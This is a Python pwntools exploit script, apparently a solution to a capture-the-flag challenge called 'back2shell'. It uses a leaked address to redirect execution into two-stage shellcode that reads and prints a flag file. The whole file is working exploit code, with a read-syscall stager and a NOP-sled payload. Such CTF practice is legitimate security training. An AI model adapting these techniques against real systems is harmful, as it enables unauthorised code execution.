#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("back2shell")

gs = """
b*0x40183e
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


shellcode = asm("""
xor edi,edi
lea rsi, [rip]
mov edx, 0x900
syscall
""")

shellcode2 = (b'\x90'*0x100 +
              asm("sub rsp, 0x500") +
              asm(shellcraft.cat('./flag'))
              )


p = start()

p.recvuntil(b'Helloworld!!! Welcome to my challenge!\n')

leak = int(p.recvline().decode(), 0)

p.send(
    shellcode.ljust(0x12, b'\0') +
    p64(leak+0x26)
)

sleep(0.5)

p.send(
    shellcode2
)

p.interactive()
